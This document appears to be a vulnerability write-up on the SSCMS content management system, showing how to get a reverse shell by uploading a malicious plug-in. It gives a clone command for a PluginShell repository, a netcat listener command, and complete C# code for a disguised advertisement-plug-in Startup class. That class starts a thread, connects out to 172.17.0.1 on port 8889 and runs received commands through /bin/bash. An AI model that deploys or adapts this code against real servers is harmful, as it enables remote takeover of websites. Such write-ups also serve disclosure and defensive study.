# Vul Function Point

Plug-in offline installation function, Rebound Shell is realized by making malicious plug-ins.

<img width="1439" alt="图片" src="https://user-images.githubusercontent.com/30547741/160279046-c5c8dcd3-5620-415f-b520-eea40009395b.png">

# Plug-in Make

```bash
git clone https://github.com/Richard-Tang/SSCMS-PluginShell.git
```

Change the IP address in “Startup.cs” File, Compile using VisualStudio tools.

<img width="965" alt="图片" src="https://user-images.githubusercontent.com/30547741/160279188-83a027ec-7c3e-4bcc-b1e6-2e793d6d1a48.png">

<img width="938" alt="图片" src="https://user-images.githubusercontent.com/30547741/160279207-09dca024-2c13-4d12-b980-fb1852845c0a.png">

compression files

<img width="891" alt="图片" src="https://user-images.githubusercontent.com/30547741/160279228-f58ecc65-d3fe-4381-a1e7-372ab41b01da.png">

# GetShell

```bash
nc -lvvp 8889
```

<img width="325" alt="图片" src="https://user-images.githubusercontent.com/30547741/160279280-bd0f2886-77c0-42e0-b0d5-942221dcd38b.png">

upload plugin

<img width="1327" alt="图片" src="https://user-images.githubusercontent.com/30547741/160279320-4e686a65-10f3-4739-bfe4-966fefdd345a.png">

Reverse Shell successfully obtains permissions

<img width="806" alt="图片" src="https://user-images.githubusercontent.com/30547741/160279377-80d8b374-7a85-4ae1-a3cd-af0a614e185f.png">

# Principle

You just need to write code that conforms to the plug-in format and invoke the corresponding function when the plug-in is installed to trigger Exploit Code。

```c#
using Microsoft.Extensions.DependencyInjection;
using SSCMS.Advertisement.Abstractions;
using SSCMS.Advertisement.Core;
using SSCMS.Plugins;
using System.Diagnostics;
using System;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.Threading;

namespace SSCMS.Advertisement
{
    public class Startup : IPluginConfigureServices
    {
        public void ConfigureServices(IServiceCollection services)
        {
            ... <--- ExploitCode
            
            services.AddScoped<IAdvertisementRepository, AdvertisementRepository>();
        }
	}
}
```

# Exp

```c#
using Microsoft.Extensions.DependencyInjection;
using SSCMS.Advertisement.Abstractions;
using SSCMS.Advertisement.Core;
using SSCMS.Plugins;
using System.Diagnostics;
using System;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.Threading;

namespace SSCMS.Advertisement
{
    public class Startup : IPluginConfigureServices
    {
        
      public void ConfigureServices(IServiceCollection services)
      {
         ThreadStart childref = new ThreadStart(reversShell);
         Thread childThread = new Thread(childref);
         childThread.Start();
         services.AddScoped<IAdvertisementRepository, AdvertisementRepository>();
      }

		public void reversShell()
		{
			Socket socketshell = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			IPAddress ip = IPAddress.Parse("172.17.0.1");
			IPEndPoint point = new IPEndPoint(ip, Convert.ToInt32("8889"));
			try
			{
				socketshell.Connect(point);
				while (true)
				{
					byte[] getdata = new byte[1024 * 5];
					int n = socketshell.Receive(getdata);
					string restr = Encoding.Default.GetString(getdata, 0, n);
					string command = restr;
					string resultok = willshell(command);
					byte[] senddata = new byte[1024 * 5];
					senddata = Encoding.Default.GetBytes(resultok);
					socketshell.Send(senddata);
				}
			}
			catch
			{
				socketshell.Close();
			}
		}

		public static string willshell(object command)
		{
			Process process = new Process();
			process.StartInfo.FileName = "/bin/bash";
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.StandardInput.WriteLine("echo off");
			process.StandardInput.WriteLine(command);
			process.StandardInput.WriteLine("exit");
			string result = process.StandardOutput.ReadToEnd();
			return result;
		}
	}
}
```
